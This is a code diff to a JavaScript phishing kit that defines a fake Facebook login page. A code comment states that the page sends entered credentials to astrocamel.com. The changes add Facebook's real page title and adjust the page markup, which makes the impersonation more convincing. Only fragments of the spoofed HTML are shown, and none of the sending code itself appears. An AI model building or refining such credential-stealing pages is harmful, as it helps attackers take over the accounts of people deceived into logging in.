@@ -14,8 +14,9 @@ function hereDoc(str) {
 }
 
 // A webpage object
-function Webpage(url, src) {
+function Webpage(url, title, src) {
     this.url = url;
+    this.title = title;
     this.getSource = hereDoc(src);
 }
 
@@ -24,6 +25,7 @@ function Webpage(url, src) {
 * but insteads sends the credentials to astrocamel.com
 */
 var facebook_fake_page = new Webpage("http://www.facebook.com",
+					"Welcome to Facebook - Log In, Sign Up or Learn More",
 					function() {/*!
 <!DOCTYPE html>
 <html id="facebook" class="tinyViewport" lang="en">
@@ -128,7 +130,7 @@ var facebook_fake_page = new Webpage("http://www.facebook.com",
 </div>
 </div>
 </div>
-<div id="globalContainer" class="uiContextualLayerParent">
+<div id="globalContainer" class="untextualLayerParent">
 <div id="content" class="fb_content clearfix">
 <div>
 <div class="gradient">
